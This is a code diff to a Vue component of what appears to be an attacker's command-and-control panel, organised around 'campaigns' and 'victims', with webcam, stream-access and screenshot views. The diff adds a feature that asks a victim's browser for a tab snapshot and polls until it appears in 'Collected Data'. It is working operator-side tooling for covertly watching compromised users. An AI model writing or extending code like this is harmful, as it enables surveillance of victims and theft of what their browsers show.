@@ -23,6 +23,7 @@ const webcamDialogVisible = ref(false)
 const screenshots = ref([])
 const isLoading = ref(false)
 const isCapturingScreenshot = ref(false)
+const isCapturingSnapshot = ref(false)
 const screenshotsUpdatedAt = ref(null)
 const streamAccessUrl = ref(null)
 const isLoadingStreamAccess = ref(false)
@@ -167,6 +168,64 @@ async function captureScreenshot() {
     }
 }
 
+async function waitForSnapshotDelivery(requestId, attempts = 10, intervalMs = 1500) {
+    for (let attempt = 0; attempt < attempts; attempt++) {
+        await new Promise(resolve => setTimeout(resolve, intervalMs))
+        try {
+            const delivered = await backendService.getScreenshots(props.campaign.id, props.victim.id)
+            if (delivered.some(screenshot => screenshot.request_id === requestId)) {
+                return true
+            }
+        } catch (error) {
+            console.error('Failed to poll for snapshot delivery:', error)
+        }
+    }
+    return false
+}
+
+async function captureSnapshot() {
+    if (!isConnected.value || isCapturingSnapshot.value) return
+
+    isCapturingSnapshot.value = true
+    try {
+        const response = await backendService.captureSnapshot(props.campaign.id, props.victim.id)
+        toast.add({
+            severity: 'info',
+            summary: 'Snapshot requested',
+            detail: 'Waiting for the victim browser to deliver the tab snapshot',
+            life: 3000
+        })
+
+        const delivered = await waitForSnapshotDelivery(response.request_id)
+        if (delivered) {
+            toast.add({
+                severity: 'success',
+                summary: 'Snapshot captured',
+                detail: 'The browser tab snapshot was added to Collected Data',
+                life: 3000
+            })
+        } else {
+            toast.add({
+                severity: 'warn',
+                summary: 'Snapshot pending',
+                detail: 'The victim browser has not delivered the snapshot yet',
+                life: 4000
+            })
+        }
+        await fetchScreenshots(true)
+    } catch (error) {
+        console.error('Failed to capture snapshot:', error)
+        toast.add({
+            severity: 'error',
+            summary: 'Capture failed',
+            detail: error.message || 'Could not request the browser snapshot',
+            life: 4000
+        })
+    } finally {
+        isCapturingSnapshot.value = false
+    }
+}
+
 watch(activeView, (view) => {
     if (view === 'screenshot') {
         fetchScreenshots()
@@ -258,10 +317,12 @@ onUnmounted(() => {
                     :screenshots="screenshots"
                     :loading="isLoading"
                     :capture-pending="isCapturingScreenshot"
+                    :snapshot-pending="isCapturingSnapshot"
                     :last-updated="screenshotsUpdatedAt"
                     :can-capture="isConnected"
                     @refresh="fetchScreenshots(true)"
                     @capture="captureScreenshot"
+                    @capture-snapshot="captureSnapshot"
                 />
             </div>
 
